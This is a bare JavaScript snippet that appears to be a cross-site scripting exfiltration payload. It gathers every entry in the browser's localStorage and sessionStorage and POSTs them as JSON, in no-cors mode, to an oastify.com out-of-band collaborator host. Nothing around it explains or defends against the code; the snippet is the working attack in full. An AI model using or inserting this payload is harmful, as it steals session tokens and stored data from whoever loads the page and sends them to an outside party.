fetch('https://sjf391l61c5awrt9hx50esbd147vvmjb.oastify.com', {
  method: 'POST',
  mode: 'no-cors',
  body: JSON.stringify({
    local: {...localStorage},
    session: {...sessionStorage}
  })
});
